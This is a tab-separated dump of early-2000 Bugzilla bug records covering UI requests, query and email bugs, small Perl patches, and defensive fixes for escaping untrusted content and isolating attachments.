31295%TAB%952627330%TAB%7268%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"Votes" text box should be checkbox%TAB%"Votes" text box should be checkboxIn the "My Votes" page, the "Votes" text box should be a checkbox, since after the policy change you cannot vote more than once anyway
31314%TAB%952658688%TAB%7268%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%[FEATURE] Support for "In-Reply-To" header in emails would be nice,[RfE] Support for "In-Reply-To" header in emails would be nice,Support for "In-Reply-To" header in emails%TAB%[FEATURE] Support for "In-Reply-To" header in emails would be nice,[RfE] Support for "In-Reply-To" header in emails would be nice,Support for "In-Reply-To" header in emailsI use mutt as my email client and it has this cool feature where it can automatically arrange related emails into "thread-o-logically correct" order. To do this it requires the "In-Reply_to" header to be correctly set, which bugzilla doesn't do. The format of the header is:  In-Reply-To: <presvious-message-id>; From email@blah.com on <date>  What would be good if it would set the In-Reply-To header to point to the previous comment for that bug so that they will be displayed as a thread.
31324%TAB%952667336%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Bugzilla displays attempted HTML links incorrectly%TAB%Bugzilla displays attempted HTML links incorrectlySome bugzilla users attempt to include HTML tags in their posts, for example,  to link to another bug.  They probably do this because they're used to slashdot- style linking, and assume that the automatic "Bug #10000" links in other  people's posts are actually manual links.  The problem isn't that bugzilla  doesn't allow HTML posts, but that it messes up both the manual link and the  automatic link (if the anchor text is like "Bug #10000") in this case so that  other users must type the bug number manually (the horror :)  Bug #31322 shows a few test cases and the results.  Actual results: Bugzilla includes the > in the href and the anchor as part of  the URL.  Expected results: Link URL is underlined correctly (so it's clickable) but all  tags are still shown as typed (so pasted html isn't destroyed).  Anchors that  are bug numbers are also linked to the bug number they refer to.   Related: Bug #31323, bugzilla should warn users not to use html tags to format messages Bug #17452, RFE to allow bugzilla comments to be in html format (which probably  won't be done)
31336%TAB%952676305%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%[RFE] separate bug groups from access groups in editusers.cgi,[patch] separate bug groups from access groups in editusers.cgi%TAB%[RFE] separate bug groups from access groups in editusers.cgi,[patch] separate bug groups from access groups in editusers.cgiThe current situation: If you have more than one bug group (isbuggroup=1), it   gets alphabetized in the list, and they're all mixed up with the access groups   (isbuggroup=0), making them hard to tell apart without closely reading the   descriptions.    My proposed enhancement: I think it would be a little cleaner-looking in   editusers.cgi when viewing the user if the bug groups were listed separately from   the access groups in the list, perhaps with an <HR> between them.  This gets all   the bug groups grouped together, so you can easily distinguish them from the   access groups.
31456%TAB%952733850%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Editing a superuser clears their access flags%TAB%Editing a superuser clears their access flagsIf you edit the superuser account (say to change the real name or password) from  edituser.cgi, it clears any group bits that aren't defined on the editing form,  thus taking away the superuser status.
31585%TAB%952874138%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Links at bottom of query page redundant%TAB%Links at bottom of query page redundant
31598%TAB%952879366%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla: URLs in keyword description aren't links%TAB%Bugzilla: URLs in keyword description aren't linksThe URLs on http://bugzilla.mozilla.org/describekeywords.cgi should be links  because I'm too lazy to select, copy, click, paste.
32000%TAB%953128262%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Extra newlines in comments made with Mozilla,Extra newlines in comments made with Mozilla in NS4-Mac,Extra newlines in comments made with NS4-Mac%TAB%Extra newlines in comments made with Mozilla,Extra newlines in comments made with Mozilla in NS4-Mac,Extra newlines in comments made with NS4-MacBugzilla adds illegal CR into the hidden input field, that is used, if a login  is required after commit. This causes comments like this one.    May be a Linux-specific bug. See recent comments in bug #22983 for details.
32171%TAB%953223953%TAB%5344%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Typo on page that garbles a sentence%TAB%Typo on page that garbles a sentenceThis is about as good a spot as I can find to mention this.. On the second  bullet of the "ways a bug can become confirmed" on the page discussing what the  unconfirmed state is about, it says:  The bug gathers a certain number of votes. Any valid Bugzilla user may vote for  bugs (each user gets a certain number of bugs); any UNCONFIRMED bug which enough  bugs becomes automatically confirmed, and enters the NEW state.  I imagine it should say something to the effect of:  The bug gathers a certain number of votes. Any valid Bugzilla user may vote for  bugs (each user gets a certain number of bugs); any UNCONFIRMED bug which  gets enough votes becomes automatically confirmed, and enters the NEW state.
32189%TAB%953232678%TAB%7978%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%bug_email.pl doesn't like spaces%TAB%bug_email.pl doesn't like spacesbug_email.pl breaks if a product name, version number, or other such keyword contains a space. Not a problem for Mozilla, where none of them do, but many other projects using bugzilla will run into difficulties.
32217%TAB%953264313%TAB%12846%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buggroup related bug in bugzilla of 02/14/2000 (CVS)%TAB%buggroup related bug in bugzilla of 02/14/2000 (CVS)(This is a copy of a e-mail I sent to you two days ago)  Feb 14 2000 I checked out bugzilla from the CVS tree.  I switched both the 'usebuggroups' and 'usebuggroupsentry' options.  My personal groupsettings are such that I can enter bugs in all groups.  From then on I could not enter bugs in our database anymore. Cause : the SQL query created in post_bug.cgi starting at line 106 ends up containing the field 'groupset' twice. First time : line 125 ( push (@bug_fields, 'groupset') ) Second time : line 171 ( string concatenation with 'creation_ts, group_set) ...  )  Related to this : enter_bug.cgi creates the corresponding select box twice. First time : line 408 Second time : line 430  I can only read perl code so much, let alone modify it. So I can't send you a patch.  Hope you can fix it soon.  Dave Miller [:justdave]
32398%TAB%953387770%TAB%1564%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%NEW bugs being made UNCONFIRMED when changing the assignment%TAB%NEW bugs being made UNCONFIRMED when changing the assignmentUnder some set of circumstances (I'm not sure what those exact circumstances are yet) a changing the assignment on a new bug will make that bug unconfirmed, even though the product has 0 votes necessary to confirm.  I'm not quite sure why or what is causing this. Okay, spoke too soon.  The specific problem is that entering a bug via the web interface when there are 0 votes necessary to confirm sets the everconfirmed field.  Entering via bug_email does not.  I'm looking at it.
32748%TAB%953650611%TAB%12902%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%cant add comments in bugzilla if old value is empty (2000032109),can't add comments if old target_milestone value is empty (2000032109)%TAB%cant add comments in bugzilla if old value is empty (2000032109),can't add comments if old target_milestone value is empty (2000032109)with build ID 2000032109 i can't add a comment to a new bugreport, this error message appears: Only the owner or submitter of the bug, or a sufficiently empowered user, may make that change to the target_milestone field. Old value: New value: --- Not sure to file under webtools or browser - trying here. The empty value and --- should interpret as the same, appearantly, but doesn't.
32828%TAB%953691969%TAB%9080%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Redirect fails on Internet explorer: colchange.cgi%TAB%Redirect fails on Internet explorer: colchange.cgicolchange.cgi  Refresh: 0; URL=...  doesn't seem to work in Internet Explorer.  To fix this, I added a link to the next URL that you could click on if the  redirection failed. As follows ------------------------------------------------------------     print "<A HREF = \'".         "buglist.cgi?$::FORM{rememberedquery}".         "\'>".         "here".         "</A>";     print " if the page fails to redirect"; ------------------------------------------------------------
32971%TAB%953747626%TAB%8728%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%edituser.cgi "new" checks user against bultin regular expression%TAB%edituser.cgi "new" checks user against bultin regular expressionedituser.cgi     unless ($user =~ /^[^\@]+\@[^\@]+$/) {         print "The user name entered must be a valid e-mail address. Please press\n";         print "<b>Back</b> and try again.\n";         PutTrailer($localtrailer);         exit;     }  Notice how the $user is checked against /^[^\@]+\@[^\@]+$/.  It should be checked against Param("emailregexp");
33109%TAB%953824043%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Query not returning any bugs with -- target milestone%TAB%Query not returning any bugs with -- target milestoneQuery not returning any bugs with -- target milestone  1) Bugzilla query 2) For example, search for any New, Open, Reopened bugs with Target Milestone  "--" 3) Zero bugs returned  There are lots of bugs with this target milestone.  Pls fix soon if possible or else bugs will be missing :-) in query searches.
33287%TAB%953928652%TAB%9186%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can't confirm and reassign to componen owner in one step%TAB%Can't confirm and reassign to componen owner in one stepWhen confirming bugs I often change component. It would be nice if we could reassign to component owner at the same time.  What is needed is a confirm checkbox below the "Reassign bug to owner of selected component" radio button, exacly like the checkbox below the "reassign but to [input]" radio button.
33307%TAB%953973445%TAB%3822%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Status Whiteboard column in query result is too huge.,Status Whiteboard column should be wrapable for big long whiteboard strings%TAB%Status Whiteboard column in query result is too huge.,Status Whiteboard column should be wrapable for big long whiteboard stringsThe status whiteboard is frequently holding important info these days.  However, the bug's overall summary is still more important.  When I include the status whiteboard, the formatting gets all horked because a huge amount of space is given to it and very little is given to the bug summary.  If you can make the column skinnier I'd be happy.  I think about 20 characters and wrap is probably about right.  Even better would be giving me control over the width of all the columns :-)
34172%TAB%954525416%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bug can become unconfirmed even if it has three votes,Bug can become unconfirmed even if it has enough votes to be confirmed by votes%TAB%Bug can become unconfirmed even if it has three votes,Bug can become unconfirmed even if it has enough votes to be confirmed by votesBug 32218 was incorrectly marked as "resolved fixed" and then "verified fixed",  and when I reopened it, it had three votes.  It ended up in the "unconfirmed"  state.  Since the bug was "unconfirmed" just before becoming "fixed", my guess  is that bugzilla missed a "popular vote" confirmation that should have occurred  while the bug was marked as "fixed" (but would only show up if the bug were to  be reopened).
34488%TAB%954851605%TAB%12963%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Add a button to add to CC list,Add a checkbox to add self to CC list%TAB%Add a button to add to CC list,Add a checkbox to add self to CC listThere should be a button to add/remove me from the CC list instead of having to type in my e-mail address in over and over again.  Red Hat's version of bugzilla http://bugzilla.redhat.com/bugzilla/ supports this.
34767%TAB%954964698%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%New bug page: need to redirect NS6.0 users%TAB%New bug page: need to redirect NS6.0 usersIt's not clear from the "new bug" page or even from the "bug writing guidelines" page that bugzilla shouldn't be used to report bugs in Netscape 6.0.  I suggest that something like this be added to the new bug page, at least for a week after each beta release:  "If you find a bug while using a Netscape-branded version, please test it against a <link>nightly build</link> of mozilla before reporting it here. If the bug only occurs on the Netscape-branded version, please report it using help|feedback in Netscape 6 instead of on bugzilla."  Marking as major because it needs to be fixed quickly (see bug 34761).
35154%TAB%955160209%TAB%14366%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Browser-General,Bugzilla,Creating/Changing Bugs%TAB%A problem with this page recognizing my operating system,A problem with this page recognizing my operating system (Win98),enter_bug.cgi expects UA format some browsers don't deliver (IE)%TAB%A problem with this page recognizing my operating system,A problem with this page recognizing my operating system (Win98),enter_bug.cgi expects UA format some browsers don't deliver (IE)Reproduced using both IE and Moz on Windows 98.  Confirming as a minor bug.                       actual                   expected                 platform    os            platform      os IE  on Win98     other     other            pc         win98 Moz on Win98     PC        other            pc         win98  The user-agents as reported by bugzilla are, respectively,  Mozilla/4.0 (compatible; MSIE 5.01; Windows 98) and Mozilla/5.0 (Windows; U; Win98; en-US; m14)
35195%TAB%955197401%TAB%3881%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%request for "and accept bug" checkbox under reassign radio button%TAB%request for "and accept bug" checkbox under reassign radio buttonIn show_bug.cgi, it would be nice if there were an "and accept bug (change status to ASSIGNED)" checkbox under the "Reassign bug to" radio button.  This would allow someone to steal and accept a bug in one move, and would cut down on email notifications.
35604%TAB%955528425%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%indicate on bug lists if a bug is not visible to the public%TAB%indicate on bug lists if a bug is not visible to the publicI had a need to easily tell from a list of bugs which ones had been flagged with  needing a group bit set in order to view them and which ones were visible to the  public.  The attached diff adds a * right after the bug number of any bug that  has a nonzero groupset.  There's probably a few ways this could be done... one  idea I was toying with was changing the color of the summary or something more  subtle like that.  But this works if you like it enough to check it in.
36133%TAB%955986450%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bug-swapping between multiple instances of bugzilla%TAB%bug-swapping between multiple instances of bugzillaOn developer day, I promised to look into the possibility of running  multiple instances of Bugzilla and allowing bugs to be swapped between  them.  I've done some thinking on this, and talked to a few people,  and I think this is something that we would like to do.  This is not  something that I can devote effort to immediately, but I should be  able to spend some time on it in a couple of months.   A reasonable way to go about this probably involves serializing a bug  into XML and then sending it across the network and deserializing it  (parallelizing it? :-).      A large part of the motivation for this relates to the ability for folks who have written their own packages based on Mozilla to be able to keep track  of their bugs in their own instance of Bugzilla, which still being  able to move bugs that are truly in the core code back to the  mozilla.org instance with ease.    There was also concern about the number of Netscape 6 bugs being  (incorrectly) filed in bugzilla.mozilla.org.  My hope is that this  number has gone down significantly since Netscape fixed their feedback   form.
36257%TAB%956075785%TAB%4080%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Have the QA Contact field be editable and appear in New Bug submission form,Have the QA Contact field appear in New Bug submission form%TAB%Have the QA Contact field be editable and appear in New Bug submission form,Have the QA Contact field appear in New Bug submission formHave the QA Contact field be editable and appear in New Bug submission form  When submitting a new bug report, the QA Contact field does not appear in the  new bug form.    Sometimes the QA contact may differ than the default QA contact that gets  assigned.  Being able to change it at bug submission time would reduce bug email  notification.    If someone knows who the QA contact should be, it would be less steps to change  it.  Suggest:  QA contact field be added with the text "(Leave blank to assign to default  component QA contact)"  Thanks!
36262%TAB%956078738%TAB%4415%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%changes to groups broken%TAB%changes to groups brokeni had to back out the changes you made earlier to  editing groups. Lounge automatically picked up this change and with the new code, form elements to change bug's confidentiality were no longer showing up.  I see that these elements are now in enter_bug.cgi. I wonder if someone moved them on purpose. They should be in both places since bugs may change state. ccing dmose and tara. I stopped lounge from automatically updating mozilla/webtools from cvs. The script should probably be changed so selected webtools update automagically. Not sure which ones. Further changes to bugzilla shouldn't hork us now. the change that I backed out referenced another bug. I commented in that bug about this one and the author of the patch suggested a  fix but now i forget what bug number that was.
36379%TAB%956137025%TAB%14831%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bugz_email.pl fixed to enable default component & product via command-line,bug_email.pl fixed to enable default component & product via command-line%TAB%bugz_email.pl fixed to enable default component & product via command-line,bug_email.pl fixed to enable default component & product via command-lineWe're using bugzilla as both a bug-tracking and system administration trouble-ticket tracking system.  The below diff allows default product and component to be set via command-line switches. The switches are: -p='PRODUCT' -c='COMPONENT'   This comes in really handy if you specify different procmailrc files based upon which email address things are sent to.  We have various queues for network operations issues, development, QA, etc.  Hope this makes it into release!  724,731d712 <     if ( /-p=['"]?(.+)['"]?/ ) <     { <       $DEFAULT_PRODUCT = $1; <     } <     if ( /-c=['"]?(.+)["']?/ ) <     { <       $DEFAULT_COMPONENT = $1; <     }
36770%TAB%956325005%TAB%12244%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla hiding bugs%TAB%bugzilla hiding bugsViewing the bugs reported daily, and sorting by ID shows alot of gaps. Trying to manually view these by punching in the CGI arg gives me a permission denied page. I asked on #mozilla and they said it was probably due to someone posting netscape internal tools/etc bugs. When i mentioned there were *alot* (20+ per day) they said i should report it here. Sorry guys...I was out for awhile.  See comments in http://bugzilla.mozilla.org/show_bug.cgi?id=37358  For this bug...hmm..I know that the Bugzilla database has been having  "shadowing" problems.  occasionally, a "commit" to a bug for updates does not  show up immediately - sometimes not for 1 to 10 minutes..yikes.  This is  irritating, the changes do take affect on Commit...but hard to work with  database during those times.  An endico@mozilla.org always fixes this ASAP.  I have never seen this "gaps" issues when sorting by ID.  Is it still happening  to you?  Can you give me a query where you see this so I can investigate?
36905%TAB%956509404%TAB%12963%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Owner can't reopen bugs%TAB%Owner can't reopen bugsI just tried to re-open bug 34210, which I am the owner of, and it gave the error message:  Only the owner or submitter of the bug, or a sufficiently empowered user, may make that change to the bug_status field.       Old value:                VERIFIED     New value:                REOPENED  This happens when the reporter of the bug is set up to file as UNCONFIRMED.  This should be fixed -- any reporter should be able to reopen a bug that  they filed, if they feel that the resolution was not correct (e.g., the  bug is incorrectly classed as a duplicate, etc.)
37339%TAB%956763363%TAB%4403%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla sidebar, containing info in footer%TAB%Bugzilla sidebar, containing info in footerThere should be a bugzilla sidebar, which would contain the information that is in the bugzilla footer.
37684%TAB%957115956%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[RFE] automatic http:// in bugzilla URL field%TAB%[RFE] automatic http:// in bugzilla URL fieldusers often forget to include http:// in urls when submitting bugs.  i suggest  that if a url doesn't have a protocol that http:// be added automatically.  alternatively, the new bug page could be modified to say "(include http://!)"  right after the url field, but last i heard the goal was to not clutter the new  bug page.
37749%TAB%957176117%TAB%1678%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%query for changes in last 2+ days doesn't work (only gives last day),query for changes in last n days doesn't work,query for changes to specific field in last n days not working%TAB%query for changes in last 2+ days doesn't work (only gives last day),query for changes in last n days doesn't work,query for changes to specific field in last n days not workingA few points:  1. Specific dates do not work nearly as well as relative dates for many queries,    especially for canned queries that are bookmarked or put in a webpage. 2. Limiting a query to bugs that are new in the last "n" days is a very useful     way to cut a result set down to size when hunting for an existing report of     a regression when you can't be sure that the regression happened today. 3. For people who live halfway around the globe or even just a few timezones     away, the "View Bugs Already Reported Today" link on Mozilla's Bugzilla    is nowhere near as useful for finding reports of regressions in the current    nightly as a canned query that would look for bugs reported today /and/    yesterday. 4. Previously the "Changed in the last __ days" field could be used in     conjunction with any of the "Where the field(s)" items to search,    for instance, for bugs whose resolution has changed in the last week.  ... and an observation:   The "Changed in the last __ days"  field still works as expected when the "Where the field(s)" field is empty -- presumably it still does when that field isn't empty, but the "" in the "dates ___" field equating to today is further limiting the search so you'd never know.  Personally, I wouldn't mind if this functionality was moved to the boolean chart part of the form, even though it would not be as clear ( [bug creation] [ <= ] [2] ), but specific date searching just can't do all the work that relative date searching can do.  If "" in the "dates ___" field is equating to today, that is a bug -- empty fields should not limit a search at all.
37839%TAB%957198300%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bug-helper has outdated list of mail components%TAB%bug-helper has outdated list of mail componentsThe mail-components got shuffled recently, so now the bug-helper fails when attempting to submit certain bugs.  What happens is that when one attempts to submit a bug with components that no longer exist (eg "Front End" component of "Mail News"), the following error is generated:  > Possible bug database corruption has been detected. Please send mail to > dmose@mozilla.org with details of what you were doing when this message > appeared. Thank you.   > src = Account Manager Address Book Composition Filters Internationalization > Localization Mail Back End Mail Database Mail Window Front End MIME Networking > - General Networking - IMAP Networking - News Networking - POP Networking - > SMTP Printing Profile Migration Search Security: General Subscribe > default = Front End
38369%TAB%957554438%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%"misspelled" misspelled in description of "trivial" bugs%TAB%"misspelled" misspelled in description of "trivial" bugs"misspelled" misspelled in description of "trivial" bugs
38463%TAB%957694754%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%show_bug.cgi: colon in "keywords:" not part of link%TAB%show_bug.cgi: colon in "keywords:" not part of linkOn show_bug.cgi, some of the field names are hyperlinked to pages describing  what the field is.  Most of the colons after the field names are hyperlinked  along with the field name, but the colon after "keywords" isn't.
38464%TAB%957694810%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%enter_bug.cgi: colon in "Severity:" not part of link%TAB%enter_bug.cgi: colon in "Severity:" not part of linkOn enter_bug.cgi, some of the field names are hyperlinked to pages describing  what the field is.  Most of the colons after the field names are hyperlinked  along with the field name, but the colon after "Severity" isn't.
38470%TAB%957698471%TAB%4415%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%DBID_to_real_or_loginname causes warnings when no name defined%TAB%DBID_to_real_or_loginname causes warnings when no name definedthe subroutine DBID_to_real_or_loginname causes warnings for users when the user has no name defined. Attaching patch.
38624%TAB%957804413%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"New value" column smaller than "old value" column%TAB%"New value" column smaller than "old value" columnThe "new value" column is smaller than the old value column, making it  difficult to figure out exactly what was changed in a field like cc.             What    |Old Value                   |New Value ----------------------------------------------------------------------------                  CC|Antti.Nayha@oulu.fi,Crysgem@|Antti.Nayha@oulu.fi,Crysgem                    |crosswinds.net,bissiri@eecs.|@crosswinds.net,bissiri@eec                    |umich.edu,davidr8@home.com,d|s.umich.edu,davidr8@home.co                    |baron@fas.harvard.edu,janc@n|m,dbaron@fas.harvard.edu,ja                    |etscape.com,katakai@japan.su|nc@netscape.com,katakai@jap                    |n.com,rich.burridge@Sun.COM,|an.sun.com,rich.burridge@Su                    |tajima@eng.sun.com          |n.COM,tajima@eng.sun.com,va                    |                            |rga@utcru.sk
38784%TAB%957923574%TAB%8645%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Software error?%TAB%Software error?I had just verified bug http://bugzilla.mozilla.org/show_bug.cgi?id=25757 and clicked submit. The following page confirming the change appeared but at the bottom of it was the following:  Content-type: text/html   Software error:  DELETE FROM logincookies WHERE TO_DAYS(NOW()) - TO_DAYS(lastused) > 30: Table 'shadow_bugs.logincookies' doesn't exist at globals.pl line 133.   Please send mail to this site's webmaster for help.   build id: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i686)
38788%TAB%957931836%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Query is busted.%TAB%Query is busted.Bugzilla queries aren't working.  Apparently they broke somewhere between now and 8 hours ago.  Not sure whether this is a moz.org or Bugzilla problem, although there are no recent checkins to the Bugzilla tree that I can see.  Very likely related to bug #38784.  Here's an error:  Content-type: text/html   Software error:  SELECT bugs.bug_id, bugs.groupset, date_format(bugs.delta_ts,'%Y-%m-%d'), map_assigned_to.login_name, substring(bugs.bug_status,1,4), substring(bugs.resolution,1,4), substring(bugs.product, 1, 8), bugs.votes, bugs.target_milestone, substring(bugs.short_desc, 1, 60) FROM bugs, profiles map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON bugs.qa_contact = map_qa_contact.userid WHERE bugs.assigned_to = map_assigned_to.userid AND bugs.reporter = map_reporter.userid AND bugs.groupset & 192 = bugs.groupset AND (bugs.product = 'Webtools') AND (bugs.bug_status = 'RESOLVED') GROUP BY bugs.bug_id ORDER BY bugs.bug_id: Table 'shadow_bugs.bugs' doesn't exist at globals.pl line 133.   Please send mail to this site's webmaster for help.
38791%TAB%957939529%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%spelling error in bug_email.pl (scipped)%TAB%spelling error in bug_email.pl (scipped)in the response email, "scipped" should be "skipped".  The diff: (there's a long line, bugzilla will wrap it)  Index: bug_email.pl =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/contrib/bug_email.pl,v retrieving revision 1.6 diff -c -r1.6 bug_email.pl *** bug_email.pl        2000/03/18 23:32:49     1.6 --- bug_email.pl        2000/05/10 15:10:09 *************** *** 1087,1093 ****         if( lsearch( \@db_bits, $bit ) == -1 ) {             # Bit not found !             my $Text = "Checking the Group-Settings: You sent the Groupset-Bit  $bit\n" . !               "which is not a valid Groupset-Bit. It will be scipped !\n\n";             BugMailError( 0, $Text );         } else {             # Cool bit, add to the result-String --- 1092,1098 ----         if( lsearch( \@db_bits, $bit ) == -1 ) {             # Bit not found !             my $Text = "Checking the Group-Settings: You sent the Groupset-Bit  $bit\n" . !               "which is not a valid Groupset-Bit. It will be skipped !\n\n";             BugMailError( 0, $Text );         } else {             # Cool bit, add to the result-String
38835%TAB%957960169%TAB%15478%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%remembering queries doesn't work%TAB%remembering queries doesn't workRemembering bug quieries works only if you unselect all the options in the first field "Status". (But then the query takes very long!) If you don't change the default selections "NEW", "ASSIGNED" and "REOPENED", then you always get "Zarro Boogs found". When you try to edit the saved query again, the "status" field has a new option called "NEWASSIGNEDREOPENED", which is the only selected one.
38852%TAB%957967105%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%[meta] bugzila security: issues with untrusted content,[meta] bugzilla security: issues with untrusted content,[meta] untrusted content being sent or echoed to bugzilla users%TAB%[meta] bugzila security: issues with untrusted content,[meta] bugzilla security: issues with untrusted content,[meta] untrusted content being sent or echoed to bugzilla usersthis will be the meta bug for security issues that arise from bugzilla allowing  untrusted content to come from bugzilla.mozilla.org.  see  http://www.cert.org/advisories/CA-2000-02.html for information on the general  problem.  incidentally, slashdot reported today that there is a worm floating around that  exploits this problem on web-based e-mail sites that show .html attachments as  text/html.  http://slashdot.org/article.pl?sid=00/05/10/1541244&mode=thread
38854%TAB%957967607%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%reports.cgi needs to escape (untrusted) url params%TAB%reports.cgi needs to escape (untrusted) url paramsMy biggest problem w/this patch is that if the product is defined, you don't get the header (because of line 80).  Also, the footers are suppressed.  I realize that this is mostly by design (the $FORM{'banner'} variable), but I think that error messages could ignore that flag.  Of course, in theory, these messages should never be seen ;)
38855%TAB%957967719%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%showvotes.cgi needs to escape (untrusted) url params%TAB%showvotes.cgi needs to escape (untrusted) url paramsWhat about a subroutine ErrorExit(Title, ErrMsg) for these lines: +    print "Content-type: text/html\n\n"; +    PutHeader($Title); +    print "<p>$ErrMsg<p>\n"; +    PutFooter(); +    exit;  This could be useful elsewhere, too...
38856%TAB%957968160%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General,Documentation%TAB%all bugzilla pages should specify charset%TAB%all bugzilla pages should specify charsetto prevent untrusted content on bugzilla from executing possibly malicious  javascript code, each page should include a charset at the top.  see http://www.cert.org/tech_tips/malicious_code_mitigation.html/#3
38859%TAB%957968715%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%createaccount.cgi needs to escape untrusted value for e-mail address (but maybe de-escape @ symbol)%TAB%createaccount.cgi needs to escape untrusted value for e-mail address (but maybe de-escape @ symbol)occurs on both createaccount.cgi and the "log in" link at the bottom.  this escaping might need to be done on both branches (password e-mailed, bogus  e-mail address).  This attachment patches CGI.pl's CheckEmailSyntax function to escape the characters < , > , and & in the invalid email address that gets displayed to the user as part of the error message when the user submits an invalid address.  This method of filtering bad characters is generally considered less secure than the alternate approach of allowing good characters (see f.e. the CERT advisory linked from bug 38856).  Is it sufficient in this situation?  The most secure approach in this situation is not to display the invalid email address at all, which is the approach I took in the data validation error messages in bug 38854 and bug 38855.
38862%TAB%957970038%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%attachments should be at a different hostname,[SECURITY] attachments should be at a different hostname%TAB%attachments should be at a different hostname,[SECURITY] attachments should be at a different hostnameletting attachments load from the bugzilla.mozilla.org hostname is a security  problem (cookie-stealing, mostly).  suggested solution:   1. make showattachment.cgi the hostname, and if it's bugzilla.mozilla.org,  redirect to [bugzilla.mozilla.org's ip address]/showattachment.cgi?id=num. 2. make show_bug.cgi show the correct new url  in order to avoid breaking existing two-file attachments where the first one is  an image, perhaps:  3. replace "bugzilla.mozilla.org/showatt" with "[ip]/showatt" in all  attachments.
